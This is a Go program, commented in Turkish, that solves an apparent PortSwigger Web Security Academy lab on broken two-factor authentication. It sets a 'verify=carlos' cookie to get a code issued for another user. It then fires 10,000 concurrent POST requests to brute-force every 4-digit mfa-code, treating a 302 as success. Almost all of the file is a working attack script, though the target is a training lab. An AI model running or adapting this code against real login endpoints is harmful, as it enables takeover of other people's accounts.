package main

/*
!!! Hızlı çözüm alabilmek için golang in threading yapısı kullanılmıştır
Buradaki mantık şu GET ile login2 sayfasına istek atınca cookie de belirtilen kullanıcı adı için
bir key mf-code değeri üretiyor ve mail ile gönderiyor
biz oradaki değere carlos yazıyoruz ve carlos adına bir key oluşturuluyor
GET login2 isteğinin header kısmında set-session değerini kaybetmemek lazım
aşşağıdaki session değerine onu ekliyoruz.
POST login2 isteğine de brute force yaparak
*/

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
)

var (
	url_    = "https://acca1ff61f9b4935c00f385900ed00db.web-security-academy.net/login2"
	session = "lpaPqaSETteiK81QekrjCmTmKxF8K6wD"
	found   = ""
)

func main() {
	pentest()
}

func pentest() {

	var wg sync.WaitGroup
	wg.Add(10000)
	for i := 0; i < 10000; i++ {

		go func(i int) {
			defer wg.Done()
			s := fmt.Sprintf("%04d", i)
			if sendReq(s) {
				found = s
				//fmt.Println("FOUND ! " + s)
				return
			}
		}(i)
	}

	wg.Wait()

	fmt.Println("FOUND ! " + found)

}

func sendReq(payload string) bool {
	//302 handle edebilmek için
	client := &http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}}
	postData := url.Values{}
	postData.Set("mfa-code", payload)
	req, _ := http.NewRequest("POST", url_, strings.NewReader(postData.Encode()))

	req.Header.Add("Cookie", "session="+session+"; verify=carlos")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len(postData.Encode())))
	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println(payload + "  ->   " + string(res.Status))
	return (string(res.Status) == "302 Found")

}

func nextPassword(n int, c string) func() string {
	r := []rune(c)
	p := make([]rune, n)
	x := make([]int, len(p))
	return func() string {
		p := p[:len(x)]
		for i, xi := range x {
			p[i] = r[xi]
		}
		for i := len(x) - 1; i >= 0; i-- {
			x[i]++
			if x[i] < len(r) {
				break
			}
			x[i] = 0
			if i <= 0 {
				x = x[0:0]
				break
			}
		}
		return string(p)
	}
}
